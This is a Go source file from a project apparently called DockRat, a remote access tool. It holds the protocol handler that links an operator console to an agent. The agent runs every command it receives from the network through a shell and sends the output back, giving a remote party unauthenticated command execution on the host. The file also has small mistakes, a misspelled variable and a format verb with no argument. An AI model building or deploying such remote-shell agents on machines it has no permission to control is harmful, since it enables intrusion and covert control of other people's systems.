// core/protocol/protocol.go
package protocol

import (
	"bufio"
	"fmt"
	"net"
	"os"

	"github.com/Singert/DockRat/core/shell"
)

func HandleConn(conn net.Conn, isAdmin bool, nodeID int) {
	defer conn.Close()

	if isAdmin {
		handleAdmin(conn, nodeID)
	} else {
		handleAgent(conn)
	}
}

func handleAdmin(conn net.Conn, nodeID int) {
	scanner := bufio.NewScanner(os.Stdin)
	writer := bufio.NewWriter(conn)
	r := bufio.NewReader(conn)
	fmt.Print("Shell> ")
	for scanner.Scan() {
		line := scanner.Text()
		writer.WriteString(line + "\n")
		writer.Flush()
		fmt.Printf("[node %d] shell", nodeID)
		for {
			response, err := r.ReadString('\n')
			if err != nil {
				fmt.Println("error reading from agent:", err)
				break
			}
			if response == "__END__\n" {
				break
			}
			fmt.Print(response)
		}

		fmt.Print("[Node %d]Shell> ")
	}
}

func handleAgent(conn net.Conn) {
	sacnner := bufio.NewScanner(conn)
	writer := bufio.NewWriter(conn)
	for sacnner.Scan() {
		line := sacnner.Text()
		output := shell.ExecCommand(line)
		writer.WriteString(output)
		writer.WriteString("\n__END__\n")
		writer.Flush()
	}
}
